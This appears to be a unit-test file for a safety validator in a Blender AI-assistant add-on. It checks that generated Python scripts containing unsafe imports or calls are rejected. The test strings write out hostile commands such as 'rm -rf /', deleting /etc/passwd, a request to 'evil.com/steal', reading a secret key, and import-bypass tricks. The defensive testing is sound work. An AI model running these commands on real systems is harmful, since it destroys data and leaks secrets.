# SPDX-FileCopyrightText: 2025 Blender Foundation
#
# SPDX-License-Identifier: GPL-2.0-or-later

"""
Tests for script validation module.

These tests validate the script validation functionality without requiring
Blender's bpy module (pure Python tests).
"""

import sys
import unittest
import importlib.util

# Import the module directly without going through the package (to avoid bpy import)
spec = importlib.util.spec_from_file_location(
    "script_validation", 
    "/home/dih/blender/scripts/addons_core/ai_assistant/script_validation.py"
)
script_validation = importlib.util.module_from_spec(spec)
spec.loader.exec_module(script_validation)

ValidationResult = script_validation.ValidationResult
validate_script_syntax = script_validation.validate_script_syntax
validate_script_safety = script_validation.validate_script_safety
get_user_friendly_error_message = script_validation.get_user_friendly_error_message
UNSAFE_MODULES = script_validation.UNSAFE_MODULES
UNSAFE_ATTRIBUTES = script_validation.UNSAFE_ATTRIBUTES
ScriptValidator = script_validation.ScriptValidator


class TestScriptSyntaxValidation(unittest.TestCase):
    """Test syntax validation."""

    def test_valid_script_syntax(self):
        """Test that a valid script passes syntax check."""
        script = """
import bpy
import mathutils

# Create a simple cube
bpy.ops.mesh.primitive_cube_add(size=2, location=(0, 0, 0))
cube = bpy.context.active_object
cube.name = "TestCube"
"""
        result = script_validation.validate_script_syntax(script)
        self.assertTrue(result.is_valid)
        self.assertEqual(result.errors, [])

    def test_invalid_syntax_missing_colon(self):
        """Test that invalid syntax is caught."""
        script = """
import bpy
for i in range(5)
    print(i)
"""
        result = script_validation.validate_script_syntax(script)
        self.assertFalse(result.is_valid)
        self.assertTrue(any("Syntax error" in e for e in result.errors))

    def test_invalid_syntax_unmatched_paren(self):
        """Test that unmatched parentheses are caught."""
        script = "print('hello'"
        result = script_validation.validate_script_syntax(script)
        self.assertFalse(result.is_valid)

    def test_empty_script(self):
        """Test that empty script is valid syntax."""
        result = script_validation.validate_script_syntax("")
        self.assertTrue(result.is_valid)


class TestSafeScripts(unittest.TestCase):
    """Test that safe scripts pass validation."""

    def test_simple_bpy_script(self):
        """Test a simple bpy script passes."""
        script = """
import bpy
import mathutils

bpy.ops.mesh.primitive_cube_add(size=2)
cube = bpy.context.active_object
cube.location = mathutils.Vector((1, 2, 3))
"""
        result = script_validation.validate_script_safety(script)
        self.assertTrue(result.is_valid, f"Expected valid but got: {result.errors}")

    def test_script_with_math(self):
        """Test script with math operations passes."""
        script = """
import bpy
import math

bpy.ops.mesh.primitive_uv_sphere_add(radius=1)
sphere = bpy.context.active_object
sphere.scale = (math.sin(0.5), math.cos(0.5), 1)
"""
        result = script_validation.validate_script_safety(script)
        self.assertTrue(result.is_valid)

    def test_script_with_materials(self):
        """Test script creating materials passes."""
        script = """
import bpy

# Create material
mat = bpy.data.materials.new(name="RedMaterial")
mat.use_nodes = True
bsdf = mat.node_tree.nodes["Principled BSDF"]
bsdf.inputs["Base Color"].default_value = (1, 0, 0, 1)

# Assign to object
bpy.ops.mesh.primitive_cube_add()
cube = bpy.context.active_object
cube.data.materials.append(mat)
"""
        result = script_validation.validate_script_safety(script)
        self.assertTrue(result.is_valid)

    def test_script_with_modifiers(self):
        """Test script with modifiers passes."""
        script = """
import bpy

bpy.ops.mesh.primitive_cube_add()
cube = bpy.context.active_object

# Add subdivision modifier
subsurf = cube.modifiers.new(name="Subdivision", type='SUBSURF')
subsurf.levels = 2
"""
        result = script_validation.validate_script_safety(script)
        self.assertTrue(result.is_valid)


class TestUnsafeImports(unittest.TestCase):
    """Test that unsafe module imports are blocked."""

    def test_import_os_blocked(self):
        """Test that importing os is blocked."""
        script = "import os"
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)
        self.assertTrue(any("os" in e.lower() for e in result.errors))

    def test_import_subprocess_blocked(self):
        """Test that importing subprocess is blocked."""
        script = "import subprocess"
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)
        self.assertTrue(any("subprocess" in e.lower() for e in result.errors))

    def test_import_sys_blocked(self):
        """Test that importing sys is blocked."""
        script = "import sys"
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)

    def test_from_os_import_blocked(self):
        """Test that 'from os import' is blocked."""
        script = "from os import system"
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)

    def test_import_socket_blocked(self):
        """Test that socket imports are blocked."""
        script = "import socket"
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)

    def test_import_requests_blocked(self):
        """Test that requests is blocked."""
        script = "import requests"
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)

    def test_import_urllib_blocked(self):
        """Test that urllib is blocked."""
        script = "import urllib.request"
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)

    def test_import_ctypes_blocked(self):
        """Test that ctypes is blocked."""
        script = "import ctypes"
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)

    def test_import_shutil_blocked(self):
        """Test that shutil is blocked."""
        script = "import shutil"
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)


class TestUnsafeOperations(unittest.TestCase):
    """Test that unsafe operations are blocked."""

    def test_os_system_blocked(self):
        """Test that os.system is blocked."""
        script = """
import bpy
import os
os.system('rm -rf /')
"""
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)
        self.assertTrue(any("system" in e.lower() for e in result.errors))

    def test_os_remove_blocked(self):
        """Test that os.remove is blocked."""
        script = "import os\nos.remove('/etc/passwd')"
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)

    def test_os_unlink_blocked(self):
        """Test that os.unlink is blocked."""
        script = "import os\nos.unlink('file.txt')"
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)

    def test_eval_blocked(self):
        """Test that eval is blocked."""
        script = "eval('1 + 1')"
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)
        self.assertTrue(any("eval" in e.lower() for e in result.errors))

    def test_exec_blocked(self):
        """Test that exec is blocked."""
        script = "exec('print(1)')"
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)
        self.assertTrue(any("exec" in e.lower() for e in result.errors))

    def test_compile_blocked(self):
        """Test that compile is blocked."""
        script = "compile('x = 1', '<string>', 'exec')"
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)

    def test_importlib_blocked(self):
        """Test that dynamic imports are blocked."""
        script = "__import__('os')"
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)
        self.assertTrue(any("__import__" in e.lower() for e in result.errors))

    def test_shutil_rmtree_blocked(self):
        """Test that shutil.rmtree is blocked."""
        script = """
import shutil
shutil.rmtree('/home/user')
"""
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)

    def test_subprocess_call_blocked(self):
        """Test that subprocess calls are blocked."""
        script = """
import subprocess
subprocess.call(['ls', '-la'])
"""
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)

    def test_sys_exit_blocked(self):
        """Test that sys.exit is blocked."""
        script = """
import sys
sys.exit(1)
"""
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)

    def test_url_in_script_blocked(self):
        """Test that URLs in scripts are blocked."""
        script = """
import requests
requests.get('https://evil.com/steal')
"""
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)
        self.assertTrue(any("network" in e.lower() or "url" in e.lower() for e in result.errors))

    def test_os_environ_blocked(self):
        """Test that os.environ access is blocked."""
        script = """
import os
api_key = os.environ.get('SECRET_KEY')
"""
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)


class TestEdgeCases(unittest.TestCase):
    """Test edge cases and bypass attempts."""

    def test_string_concatenation_import(self):
        """Test that string concatenation import tricks are blocked."""
        script = """
import bpy
mod = __import__('o' + 's')
mod.system('ls')
"""
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)

    def test_getattr_bypass_attempt(self):
        """Test that getattr tricks are blocked."""
        script = """
import bpy
os = __import__('os')
getattr(os, 'system')('ls')
"""
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)

    def test_private_module_import(self):
        """Test that importing private modules is blocked."""
        script = "import _thread"
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)
        self.assertTrue(any("private" in e.lower() for e in result.errors))

    def test_bytecode_file_reference(self):
        """Test that bytecode references are blocked."""
        script = "import __pycache__.something"
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)

    def test_multiline_script_with_single_violation(self):
        """Test that one violation in large script is caught."""
        script = """
import bpy

# Lots of safe code
bpy.ops.mesh.primitive_cube_add()
cube = bpy.context.active_object
cube.name = "Test"

# One unsafe line
import os

# More safe code
cube.location = (0, 0, 0)
"""
        result = script_validation.validate_script_safety(script)
        self.assertFalse(result.is_valid)


class TestErrorMessages(unittest.TestCase):
    """Test error message formatting."""

    def test_single_error_message(self):
        """Test message for single error."""
        result = script_validation.ValidationResult(False, ["Unsafe import detected"])
        msg = script_validation.get_user_friendly_error_message(result)
        self.assertIn("Script validation failed", msg)
        self.assertIn("Unsafe import", msg)

    def test_multiple_errors_message(self):
        """Test message for multiple errors."""
        result = script_validation.ValidationResult(
            False,
            ["Error 1", "Error 2", "Error 3", "Error 4", "Error 5", "Error 6"]
        )
        msg = script_validation.get_user_friendly_error_message(result)
        self.assertIn("6 issues", msg)
        self.assertIn("and 1 more", msg)

    def test_valid_message(self):
        """Test message for valid script."""
        result = script_validation.ValidationResult(True)
        msg = script_validation.get_user_friendly_error_message(result)
        self.assertIn("passed", msg)


if __name__ == '__main__':
    unittest.main()
